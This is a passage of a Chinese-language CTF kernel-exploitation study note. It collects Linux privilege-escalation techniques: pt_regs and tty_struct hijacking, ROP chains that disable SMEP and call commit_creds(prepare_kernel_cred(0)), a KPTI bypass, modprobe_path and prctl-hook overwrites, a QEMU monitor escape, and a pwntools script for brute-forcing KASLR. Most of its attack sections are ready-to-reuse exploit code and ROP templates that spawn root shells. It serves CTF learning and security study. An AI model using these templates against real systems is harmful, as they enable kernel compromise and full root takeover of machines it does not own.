rcx;\n    unsigned long rdx;\n    unsigned long rsi;\n    unsigned long rdi;\n/*\n * On syscall entry, this is syscall#. On CPU exception, this is error code.\n * On hw interrupt, it's IRQ number:\n */\n    unsigned long orig_rax;\n/* Return frame for iretq */\n    unsigned long rip;\n    unsigned long cs;\n    unsigned long eflags;\n    unsigned long rsp;\n    unsigned long ss;\n/* top of stack page */\n};\n```\n\n当我们调用syscall的时候，会将以上寄存器压入内核栈中，然后形成如上的结构，即如下汇编所示\n\n```c\n__asm__(\n    \"mov r15, 0xbeefdead;\"\n    \"mov r14, pop_rdi_ret;\"\n    \"mov r13, init_cred;\" // add rsp, 0x40 ; ret\n    \"mov r12, commit_creds;\"\n    \"mov rbp, swapgs_restore_regs_and_return_to_usermode;\"\n    \"mov rbx, 0x1111;\"\n    \"mov r11, 0x1111;\"\n    \"mov r10, 0x400db8;\"\n    \"mov r9, user_cs;\"\n    \"mov r8, user_rflags;\"\n    \"xor rax, rax;\"\n    \"mov rcx, user_sp;\"\n    \"mov rdx, user_ss;\"\n    \"mov rsi, rsp;\"\n    \"mov rdi, seq_fd;\"\n    \"syscall\"\n);\n```\n\n如上的汇编会在内核栈中形成如下\n\n![image-20220115110535050](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png)\n\n所以如果借助`add_rsp xx;pop_ret`这类指令，就可以将我们的控制流的栈拉高到我们可控数据范围，进而劫持栈。使用`commit(cred)`提权（这里的提权因为无法控制rdi，所以就借助`init_cred`来提权）。提权之后借助`swapgs_restore_regs_and_return_to_usermode`函数中的pop系列来调整栈，即借用了几个栈的位置，就得少几个pop，如图借用了5个栈数据，那么我们最后就得使得该函数少pop5个，即将swapgs_restore_regs_and_return_to_usermode函数的gadget+=9即可\n\n```c\nswapgs_restore_regs_and_return_to_usermode += 9;\n```\n\n![image-20220115113005162](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png)\n\n如上修改之后就可以当进入到该函数的swapgs的时候，将栈调整至最开始因为syscall而形成的保存pt_regs结构体中的用户态数据的地方，使得提权之后成功返回用户态\n\n```c\nstruct pt_regs {\n//.....................\n/* Return frame for iretq */\n    unsigned long rip;\n    unsigned long cs;\n    unsigned long eflags;\n    unsigned long rsp;\n    unsigned long ss;\n/* top of stack page */\n};\n```\n\n所示栈如下\n\n![image-20220115113622350](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png)\n\n使用此种方法时一般可以先设置一些标志性数据，“AAAAAA”在栈上，然后搜寻即可，以此来寻找调栈所用的gadget。\n\n```c\n__asm__(\n    \"mov r15, 0xbeefdead;\"\n    \"mov r14, pop_rdi_ret;\"\n    \"mov r13, init_cred;\" // add rsp, 0x40 ; ret\n    \"mov r12, commit_creds;\"\n    \"mov rbp, swapgs_restore_regs_and_return_to_usermode;\"\n    \"mov rbx, 0x6565656565;\"\n    \"mov r11, 0x1111;\"\n    \"mov r10, 0x1111;\"\n    \"mov r9, 0x1111;\"\n    \"mov r8, 0x1111;\"\n    \"xor rax, rax;\"\n    \"mov rcx, 0x1111;\"\n    \"mov rdx, 8;\"\n    \"mov rsi, rsp;\"\n    \"mov rdi, seq_fd;\"\n    \"syscall\"\n);\n```\n\n然后在某个地址范围进行搜索，就能找到该结构体的位置，好像只能是peda比较好用\n\n```\nfind \"AAAAAA\" 0xffffc900001d3f80 0xffffc900001d3f98\n```\n\n### 借助ptmx设备(tty_struct)\n\n```\nentry_SYSCALL_64`->`SyS_write`->`SYSC_write`->`vfs_write`\n->`__vfs_write`->`tty_write`->`do_tty_write`->`n_tty_write`->`pty_write`\n```\n\n原理就是劫持`tty_struct`结构体中的`const struct tty_operations *ops`结构体指针，然后再修改`fake_tty_operations`结构体中的`pty_write`函数指针，通过对该设备进行写操作进而调用劫持的函数指针，控制执行流程。\n\n同时在调用的时候rax为从劫持的tty_struct结构体中获取的`operations *ops`指针，该指针可以被我们修改劫持。之后借助一个对rax和rsp进行操作的`gadget--movRspRax_decEbx_ret`进而劫持栈，完成程序流和栈的劫持。\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long getR = (unsigned long)getroot;\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\n\nvoid* fake_tty_operations[30];\nfor(int i = 0; i < 30; i++)\n{\nfake_tty_operations[i] = movRspRax_decEbx_ret;\n}\nfake_tty_operations[0] = pop_rax_rbx_r12_r13_rbp_ret;\nfake_tty_operations[1] = (size_t)rop;\n\n\nsize_t fake_tty_struct[4] = {0};\nfake_tty_struct[0] = 0x0000000100005401;//need to set magic number\nfake_tty_struct[1] = 0;\nfake_tty_struct[2] = 0;\nfake_tty_struct[3] = (size_t)fake_tty_operations;\n\n\nrop[i++] = pop_rdi_ret;      // pop_rax_rbx_r12_rbp_ret\nrop[i++] = 0x6f0;\nrop[i++] = movCr4Rdi_pop_rbp_ret;      // mov cr4, rax; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)getR;\nrop[i++] = swapgs_popRbp_ret;      // swapgs;ret\nrop[i++] = 0x0;\nrop[i++] = iretq;      // iretq\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n\n\n## 2.栈\n\n### (1)commit_creds(prepare_kernel_cred(0));\n\n这个算是比较常规的栈溢出，不过还需要注意SMEP/SMAP以及KPTI是否开启\n\n#### ①开启SMEP情况\n\n这种情况一般直接溢出然后关闭，或者知道基地址之后可以尝试在内核完成提权然后返回用户态\n\n##### ROP关闭SMEP保护，执行用户态提权代码\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long getR = (unsigned long)getroot;\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\nrop[i++] = pop_rdi_ret;      // \nrop[i++] = 0x6f0;\nrop[i++] = movCr4Rdi_pop_rbp_ret;  // mov cr4, rax; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)getR;\nrop[i++] = swapgs_popRbp_ret; \nrop[i++] = 0x0;\nrop[i++] = iretq;      \t\t\t// iretq\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n##### ROP在内核态提权后返回用户态起Shell\n\n```c\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\nrop[i++] = pop_rdi_ret;      \nrop[i++] = 0x0;\nrop[i++] = prepare_kernel_cred_k;  \nrop[i++] = pop_rdx_rbx_rbp_ret;\nrop[i++] = pop_rbp_ret;\nrop[i++] = 0x0;      \nrop[i++] = 0xdeadbeef;\nrop[i++] = movRdiRax_call_rdx; \nrop[i++] = commit_creds_k;\nrop[i++] = swapgs_ret;              \nrop[i++] = iretq;            /* saved EFLAGS */\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n#### ②未开启SMEP情况\n\n直接调用用户空间的提权代码，返回之后起shell即可\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long getR = (unsigned long)getroot;\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\nrop[i++] = (size_t)getR;\nrop[i++] = swapgs_popRbp_ret; \nrop[i++] = 0x0;\nrop[i++] = iretq;      // iretq\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n(2)\n\n\n\n## 3.mmap内存映射\n\n还没看太懂，涉及文件系统和驱动的内存映射\n\n可以参考`LINECTF-2022-ecrypt`，后面有提到借助kern_table数组来利用\n\n\n\n## 4.常见提权手段\n\n### 修改modprobe_path\n\n这个设方法如果开启如下配置则不可用，表示`modprobe_path`为只读，不可修改\n\n```\n//v4.11及之后存在\nCONFIG_STATIC_USERMODEHELPER=y\nCONFIG_STATIC_USERMODEHELPER_PATH=\"\"\n```\n\n常常结合UAF漏洞来任意申请\n\nstarctf2019-hackme--[starctf2019-hackme | PIG-007](https://pig-007.github.io/2021/08/14/starctf2019-hackme/)\n\n西湖论剑--easy_kernel--[2021 西湖论剑 线上初赛 WP – Crispr –热爱技术和生活 (crisprx.top)](https://www.crisprx.top/archives/495)\n\n```\ncat /proc/kallsyms| grep modprobe_path\n```\n\n如果没有的话，可以先看借助`kallsyms`来`__request_module`函数的地址，然后查看该函数的汇编，获取`modprobe_path`的引用\n\n![image-20220328144717290](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281447847.png)\n\n然后制作一个拷贝flag并且改权限的copy.sh文件，使得modprobe_path指向该文件，然后运行一个错误格式的文件，那么出错之后就会以root权限运行modprobe_path，从而以root权限运行我们的copy.sh，使得我们能够读取flag了。\n\n```c\nstrncpy(mem,\"/home/pwn/copy.sh\\0\",18);\nwrite_to_kernel(fd,0xc,mem,18,0);\n\nsystem(\"echo -ne '#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh\");\nsystem(\"chmod +x /home/pwn/copy.sh\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n\nsystem(\"/home/pwn/dummy\");\nsystem(\"cat flag\");\n```\n\n### 修改init_cred\n\ninit进程是初始进程，不被动态分配，知道kernel基地址的时候，就能得到该结构体的地址。\n\n```bash\ncat /proc/kallsyms |grep init_cred\n```\n\n这种方法一般用在没办法修改到本进程的cred结构体的时候，之后使用即可提权\n\n```c\n//pop_rdi_ret init_cred_addr commit_creds_addr即可\ncommit_creds(&init_cred)\n```\n\n### 劫持prtcl_hook\n\n[pwnKernel从0开始(四) | PIG-007](http://localhost:4000/2021/10/19/Kernel从0开始(四)/#3-劫持prctl函数)\n\n```\nprctl->security_task_prctl->prctl_hook->orderly_poweroff->__orderly_poweroff->run_cmd(poweroff_cmd)-> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)\n\nprctl->security_task_prctl->prctl_hook->poweroff_work_fun->run_cmd(poweroff_cmd)-> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)\n```\n\n#### (1)劫持为orderly_poweroff函数\n\n劫持该hook为orderly_poweroff函数，然后调用prctl函数即可操纵程序流进入`orderly_poweroff`函数，再劫持`poweroff_cmd`即可顺着`orderly_poweroff`函数来运行`call_usermodehelper(poweroff_cmd)`，该函数是以root权限运行，所以能够直接提权，不过一般运行一个反弹shell的程序。当然如果有KASLR就要爆破或者泄露了。\n\n最后需要执行`prctl(0,0)`；\n\n#### (2)劫持为poweroff_work_fun函数\n\n与劫持`orderly_poweroff`函数同理，劫持为`poweroff_work_fun`函数也可以以root权限执行`poweroff_cmd`\n\n\n\n#### (3)获取地址\n\n##### ①prctl_hook\n\n可以通过编写一个小程序，然后给`security_task_prctl`函数下断点，运行到`call QWORD PTR[rbx+0x18]`即可看到对应的rbx+0x18上存放的地址，即可获取到`prct_hook_addr`，劫持修改即可\n\n##### ②poweroff_cmd、orderly_poweroff、poweroff_work_fun\n\npoweroff_cmd是一个全局变量，可以直接获取地址然后修改。可以直接使用nm命令来获取，或者直接进入gdb打印即可。\n\n![image-20211021105456058](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png)\n\n此外orderly_poweroff也是一样的获取。如果无法查到，那么可以启动qemu，先设置为root权限后\n\n`cat /proc/kallsyms | grep \"orderly_poweroff\"`即可，或者编译一个对应版本的内核进行查询。\n\n![image-20211021105603666](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png)\n\n`poweroff_work_fun`函数也是类似的获取方式\n\n\n\n\n\n# 七、意想不到的方式\n\n## 1.QEMU逃逸\n\n当没有关闭monitor时，可以直接ctrl+A C进去逃逸，解压rootfs.img读flag\n\n```bash\nmigrate \"exec:cp rootfs.img /tmp \"\nmigrate \"exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2\"\nmigrate \"exec:cat /tmp/flag 1>&2\"\n(qemu) migrate \"exec:cat /tmp/flag 1>&2\"\nflag{test_flag}qemu-system-x86_64: failed to save SaveStateEntry with id(name):)\nqemu-system-x86_64: Unable to write to command: Broken pipe\nqemu-system-x86_64: Unable to write to command: Broken pipe\n\n\nzcat rootfs.cpio | cpio -idmv 1>&2\n```\n\n## 2.权限及相关配置问题\n\n有的根目录或者bin目录的所有者不是root时\n\n### (1)bin目录不为ROOT\n\n![image-20220302114830086](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png)\n\n这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell\n\n![image-20220302114945940](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png)\n\n### (2)根目录不为ROOT\n\n![image-20220302115207278](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png)\n\n那么在根目录下，虽然bin的所有者为root，但是缺可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。\n\n```bash\nmv bin evil_bin\n/evil_bin/mkdir bin\necho \"#!/evil_bin/sh\" > /bin/power\necho \"/evil_bin/sh\" >> /bin/power\nexit\n```\n\n### (3)密码未设置\n\n如果root账号的密码没有设置的话，直接su即可登录到root，非预期的。\n\n\n\n# 八、模板\n\n## 1.保存状态\n\n```c\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    printf(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\\n\");\n}\n```\n\n## 2.用户态起Shell\n\n```c\nvoid getRootShell(void)\n{   \n    puts(\"\\033[32m\\033[1m[+] Backing from the kernelspace.\\033[0m\");\n\n    if(getuid())\n    {\n        puts(\"\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\");\n        exit(-1);\n    }\n\n    puts(\"\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\");\n    system(\"/bin/sh\");\n}\n```\n\n## 3.返回用户态\n\n### (1)没有KPTI\n\n正常的swapgs和iretq\n\nROP布局如下\n\n```c\nswapgs_ret\niretq\n&get_shell,\nuser_cs,\nuser_rflags,\nuser_sp,\nuser_ss\n```\n\n### (2)存在KPTI\n\n[Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/240006#h3-2)\n\n从`swapgs_restore_regs_and_return_to_usermode`函数某处开始执行\n\n```\nmov    rdi,rsp   //该处开始执行\nmov    rsp,QWORD PTR gs:0x6004\n```\n\nROP布局如下\n\n```\nswapgs_restore_regs_and_return_to_usermode+22,\n0,\n0,\n&get_shell,\nuser_cs,\nuser_rflags,\nuser_sp,\nuser_ss\n```\n\n## 4.爆破KASLR\n\n参考：[【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3's blog](https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/)\n\n### (1)POC里\n\n```c\noffset = (argv[1]) ? atoi(argv[1]) : 0;\n\n\nROP[i++] = POP_RDI_RET + offset;\nROP[i++] = 0;\nROP[i++] = PREPARE_KERNEL_CRED + offset;\nROP[i++] = COMMIT_CREDS + offset;\nROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22 + offset;\n```\n\n### (2)打远程的EXP\n\n```python\nfrom pwn import *\nimport base64\n#context.log_level = \"debug\"\n\nwith open(\"./exp\", \"rb\") as f:\n    exp = base64.b64encode(f.read())\n    \np = process('./run.sh')#remote(\"127.0.0.1\", 1234)\ntry_count = 1\nwhile True:\n    log.info(\"no.\" + str(try_count) + \" time(s)\")\n    p.sendline()\n    p.recvuntil(\"~ $\")\n\n    count = 0\n    for i in range(0, len(exp), 0x200):\n        p.sendline(\"echo -n \\\"\" + exp[i:i + 0x200].decode() + \"\\\" >> b64_exp\")\n        count += 1\n\n    for i in range(count):\n        p.recvuntil(\"~ $\")\n    \n    p.sendline(\"cat b64_exp | base64 -d > ./exploit\")\n    p.sendline(\"chmod +x ./exploit\")\n    randomization = (try_count % 1024) * 0x100000\n    log.info('trying randomization: ' + hex(randomization))\n    p.sendline(\"./exploit \" + str(randomization))\n    if not p.recvuntil(b\"Rebooting in 1 seconds..\", timeout=60):\n        break\n    log.warn('failed!')\n    try_count += 1\n\nlog.success('success to get the root shell!')\np.interactive()\n```\n\n## 5.retUsr模板\n\n```C\nstruct trap_frame{\n    void *rip;\n    uint64_t cs;\n    uint64_t rflags;\n    void * rsp;\n    uint64_t ss;\n}__attribute__((packed));    // 保存状态的结构体\nstruct trap_frame status;     // 保存状态\n\n// 将状态保存在status中\nvoid save()                  \n{\n    asm(\n        \"mov %%ss, %0\\n\"\n        \"mov %%rsp, %1\\n\"\n        \"pushfq\\n\"\n        \"pop %2\\n\"\n        \"mov %%cs, %3\\n\"\n        :\"=r\"(status.ss),\"=r\"(status.rsp),\"=r\"(status.rflags),\"=r\"(status.cs)\n        :\n        :\"memory\"\n        );\n    status.rip = shell;\n}\n\nvoid retUsr()\n{\n    commit_creds(prepare_kernel_cred(0));\n    asm(\n        \"swapgs\\n\"\n        \"mov $status,%rsp\\n\"\n        \"iretq\"\n        );\n}\n```\n\n\n\n# 九、常见可利用结构体\n\n参考：[【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-系列结构体)\n\n## 1.tty系列结构体---kmalloc-1024\n\n打开设备：`/dev/ptmx`\n\ntty_struct 的魔数为 `0x5401`，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体。\n\n上面**堆->借助ptmx设备**讲过了\n\n\n\n## 2.seq_operations结构体----kmalloc-32\n\n打开设备：`proc/self/stat`\n\n该结构体定义于 `/include/linux/seq_file.h` 当中，大小为0x20\n\n```c\nstruct seq_operations {\n\tvoid * (*start) (struct seq_file *m, loff_t *pos);\n\tvoid (*stop) (struct seq_file *m, void *v);\n\tvoid * (*next) (struct seq_file *m, void *v, loff_t *pos);\n\tint (*show) (struct seq_file *m, void *v);\n};\n```\n\n通过函数指针泄露地址，再劫持start函数指针后对该设备进行读写即可调用劫持的start函数指针，控制程序流程。读写的时候可通过syscall创建`pt_regs`结构体来布置内核栈环境，然后通过`swapgs_restore_regs_and_return_to_usermode`函数返回用户空间。\n\n[西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/260055#h3-5)\n\n\n\n## 3.subprocess_info结构体---kmalloc-128\n\n通过以下语句可以分配得到一个`subprocess_info`结构体，不同版本大小不同，如下版本形式的为0x60，使用kmalloc-128分配器\n\n```c\nsocket(22, AF_INET, 0);\n```\n\n结构体\n\n```c\nstruct subprocess_info {\n    struct work_struct work;\n    struct completion *complete;\n    const char *path;\n    char **argv;\n    char **envp;\n    struct file *file;\n    int wait;\n    int retval;\n    pid_t pid;\n    int (*init)(struct subprocess_info *info, struct cred *new);\n    void (*cleanup)(struct subprocess_info *info);\n    void *data;\n} __randomize_layout;\n```\n\n该结构体在分配时最终会调用其中的`void (*cleanup)(struct subprocess_info *info);`函数指针，所以如果存在一个UAF和条件竞争，在分配时启动另一个线程不断修改该函数指针，那么就能劫持程序流，再利用一些gadget就可以控制得到。\n\n[SCTF flying_kernel 出题总结 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/264563#h2-2)\n\n## 4.ldt_struct结构体---kmalloc-16\n\n参考：[在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/266897#h3-5)\n\n### (1)前置知识\n\n#### 结构体\n\n`ldt`是即局部段描述符表（Local Descriptor Table），存放着进程的段描述符，在内核中有结构体`ldt_struct`与之对应。大小为0x10。\n\n如下结构体\n\n```c\n//v5.17 /arch/x86/include/asm/mmu_context.h\nstruct ldt_struct {\n\t/*\n\t * Xen requires page-aligned LDTs with special permissions.  This is\n\t * needed to prevent us from installing evil descriptors such as\n\t * call gates.  On native, we could merge the ldt_struct and LDT\n\t * allocations, but it's not worth trying to optimize.\n\t */\n\tstruct desc_struct\t*entries;\n\tunsigned int\t\tnr_entries;\n\n\t/*\n\t * If PTI is in use, then the entries array is not mapped while we're\n\t * in user mode.  The whole array will be aliased at the addressed\n\t * given by ldt_slot_va(slot).  We use two slots so that we can allocate\n\t * and map, and enable a new LDT without invalidating the mapping\n\t * of an older, still-in-use LDT.\n\t *\n\t * slot will be -1 if this LDT doesn't have an alias mapping.\n\t */\n\tint\t\t\tslot;\n};\n```\n\n该结构体可以通过系统调用`SYS_modify_ldt`来操控，想要调用该系统调用号需要编译时开启如下设置，不过一般都是默认开启的，从v4.3版本才开始较为正式的一个编译设置\n\n```\nCONFIG_MODIFY_LDT_SYSCALL=y\n```\n\n#### 系统调用函数\n\n具体的函数调用如下\n\n```c\n//v5.17 /arch/x86/kernel/ldt.c\nSYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,\n\t\tunsigned long , bytecount)\n{\n\tint ret = -ENOSYS;\n\n\tswitch (func) {\n\tcase 0:\n\t\tret = read_ldt(ptr, bytecount);//读取\n\t\tbreak;\n\tcase 1:\n\t\tret = write_ldt(ptr, bytecount, 1);//写入\n\t\tbreak;\n\tcase 2:\n\t\tret = read_default_ldt(ptr, bytecount);\n\t\tbreak;\n\tcase 0x11:\n\t\tret = write_ldt(ptr, bytecount, 0);\n\t\tbreak;\n\t}\n\t/*\n\t * The SYSCALL_DEFINE() macros give us an 'unsigned long'\n\t * return type, but tht ABI for sys_modify_ldt() expects\n\t * 'int'.  This cast gives us an int-sized value in %rax\n\t * for the return code.  The 'unsigned' is necessary so\n\t * the compiler does not try to sign-extend the negative\n\t * return codes into the high half of the register when\n\t * taking the value from int->long.\n\t */\n\treturn (unsigned int)ret;\n}\n```\n\n也就是传入syscall相关参数，会调用不同函数，0对应`read_ldt`，1对应`write_ldt`(其实0x11的也差不多，就是`oldmode`设置为0了而已，具体的还得依据源码进行分析)，依此看代码类似如下\n\n```c\n//read_ldt从ldt_struct->entries读取8字节给buf\nsyscall(SYS_modify_ldt, 0, &buf, 8);\n\n//write_ldt依据传入的buf数据和 sizeof(desc)创建一个新的ldt_struct结构体\nsyscall(SYS_modify_ldt, 1, &buf, sizeof(buf));\n```\n\n### (2)实现任意读取\n\n主要看`write_ldt`和`read_ldt`函数，由于调用`write_ldt`函数时，会创建一个新的`ldt_struct`一些和利用无关的代码就先省略了\n\n```c\n//v5.17 /arch/x86/kernel/ldt.c\n\nstatic int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct ldt_struct *new_ldt, *old_ldt;\n\tunsigned int old_nr_entries, new_nr_entries;\n\tstruct user_desc ldt_info;\n\tstruct desc_struct ldt;\n\tint error;\n\n    //.........//\n    //从用户数据拷贝sizeof(ldt_info)数据给ldt_info\n\tif (copy_from_user(&ldt_info, ptr, sizeof(ldt_info)))\n\t\tgoto out;\n\n\t//.........//\n    //依据一些条件来进行处理\n\tif ((oldmode && !ldt_info.base_addr && !ldt_info.limit) ||\n\t    LDT_empty(&ldt_info)) {\n\t\t/* The user wants to clear the entry. */\n\t\tmemset(&ldt, 0, sizeof(ldt));\n\t} else {\n        //seg_32bit最好直接设置为1,不设置其实也不会进去啦,\n        //allow_16bit_segments基本都会返回true\n\t\tif (!ldt_info.seg_32bit && !allow_16bit_segments()) {\n\t\t\terror = -EINVAL;\n\t\t\tgoto out;\n\t\t}    \n/*\nstatic bool allow_16bit_segments(void)\n{\n\tif (!IS_ENABLED(CONFIG_X86_16BIT))\n\t\treturn false;\n\n#ifdef CONFIG_XEN_PV\n\n\t * Xen PV does not implement ESPFIX64, which means that 16-bit\n\t * segments will not work correctly.  Until either Xen PV implements\n\t * ESPFIX64 and can signal this fact to the guest or unless someone\n\t * provides compelling evidence that allowing broken 16-bit segments\n\t * is worthwhile, disallow 16-bit segments under Xen PV.\n\tif (xen_pv_domain()) {\n\t\tpr_info_once(\"Warning: 16-bit segments do not work correctly in a Xen PV guest\\n\");\n\t\treturn false;\n\t}\n#endif\n\n\treturn true;\n}\n*/\n\t\t//一些相关的设置,会导致ldt里的数据被更改\n\t\tfill_ldt(&ldt, &ldt_info);\n\t\tif (oldmode)\n\t\t\tldt.avl = 0;\n\t}\n    \n/*\nstatic inline void fill_ldt(struct desc_struct *desc, const struct user_desc *info)\n{\n\tdesc->limit0\t\t= info->limit & 0x0ffff;\n\n\tdesc->base0\t\t= (info->base_addr & 0x0000ffff);\n\tdesc->base1\t\t= (info->base_addr & 0x00ff0000) >> 16;\n\n\tdesc->type\t\t= (info->read_exec_only ^ 1) << 1;\n\tdesc->type\t       |= info->contents << 2;\n\t//Set the ACCESS bit so it can be mapped RO\n\tdesc->type\t       |= 1;\n\n\tdesc->s\t\t\t= 1;\n\tdesc->dpl\t\t= 0x3;\n\tdesc->p\t\t\t= info->seg_not_present ^ 1;\n\tdesc->limit1\t\t= (info->limit & 0xf0000) >> 16;\n\tdesc->avl\t\t= info->useable;\n\tdesc->d\t\t\t= info->seg_32bit;\n\tdesc->g\t\t\t= info->limit_in_pages;\n\n\tdesc->base2\t\t= (info->base_addr & 0xff000000) >> 24;\n\t//\n\t * Don't allow setting of the lm bit. It would confuse\n\t * user_64bit_mode and would get overridden by sysret anyway.\n\tdesc->l\t\t\t= 0;\n}\n*/\n\n    //.......//\n    //依据sizeof(ldt_struct)用kmalloc申请chunk作为new_ldt\n\tnew_ldt = alloc_ldt_struct(new_nr_entries);\n\n/*\nstatic struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)\n{\n\tstruct ldt_struct *new_ldt;\n\tunsigned int alloc_size;\n\n\t//.....//\n\t//依据sizeof(ldt_struct)用kmalloc申请chunk作为new_ldt\n\tnew_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);\n\t//....//\n\t \n\tif (alloc_size > PAGE_SIZE)\n\t\tnew_ldt->entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);\n\telse\n\t\tnew_ldt->entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);\n\n\tif (!new_ldt->entries) {\n\t\tkfree(new_ldt);\n\t\treturn NULL;\n\t}\n\n\t//The new LDT isn't aliased for PTI yet. \n\tnew_ldt->slot = -1;\n\tnew_ldt->nr_entries = num_entries;\n\treturn new_ldt;\n}\n*/\n    \n    //.......//\n    \n    //设置新ldt_struct结构体的entries指针\n    if (old_ldt)\n        memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);\n\n    //从ldt结构体中拷贝8个字节到对应位置\n    new_ldt->entries[ldt_info.entry_number] = ldt;\n\n    //......///\n    \n    install_ldt(mm, new_ldt);\n\tunmap_ldt_struct(mm, old_ldt);\n\tfree_ldt_struct(old_ldt);\n    //......//\nout:\n\treturn error;\n}\n```\n\n- 将我们的传入的数据指针`ptr`，当作一个`user_desc`结构体拷贝给`ldt_info`\n- 然后依据`ldt_info`来设置`desc_struct`结构体`ldt`\n- 之后依据`sizeof(ldt_struct)`用`kmalloc`申请`chunk`作为`new_ldt`\n- 如果存在`old_ldt`，那么就将`old_ldt->entriesd`的数据的拷贝给新的`new_ldt->entries`\n- 最后将`ldt`(8个字节)的内容赋值给`new_ldt->entries[ldt_info.entry_number]`\n- 在退出前还会插入`new_ldt`并且解开`old_ldt`，释放`old_ldt`\n\n```c\n//v5.17 /arch/x86/include/uapi/asm/ldt.h\nstruct user_desc {\n\tunsigned int  entry_number;\n\tunsigned int  base_addr;\n\tunsigned int  limit;\n\tunsigned int  seg_32bit:1;\n\tunsigned int  contents:2;\n\tunsigned int  read_exec_only:1;\n\tunsigned int  limit_in_pages:1;\n\tunsigned int  seg_not_present:1;\n\tunsigned int  useable:1;\n#ifdef 